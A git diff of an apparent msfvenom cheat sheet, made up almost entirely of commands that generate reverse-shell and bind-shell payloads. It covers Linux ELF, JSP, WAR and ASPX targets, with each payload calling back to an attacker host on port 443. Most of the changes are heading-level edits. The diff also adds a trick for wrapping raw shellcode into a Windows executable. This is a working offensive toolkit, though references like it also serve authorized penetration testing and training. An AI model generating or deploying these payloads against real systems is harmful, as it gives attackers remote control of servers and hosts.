@@ -55,17 +55,23 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf > rev_shel
 msfvenom -p linux/x64/shell/bind_tcp LHOST=$LHOST -f elf > rev_shell.elf
 ```
 
-# Java Server Pages (.jsp)
+## Java Server Pages (.jsp)
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f raw > shell.jsp
 ```
 
-## As .war
+### As .war
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f war -o shell.war
 ```
 
-# Active Sever Pages Extended (.aspx)
+## Active Sever Pages Extended (.aspx)
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f aspx -o rev_shell.aspx
+```
+
+## tricks
+### make executable binary with input shellcode
+```bash
+cat payload.bin | msfvenom -p - -f exe -a x64 --platform win -o output.exe
 ```
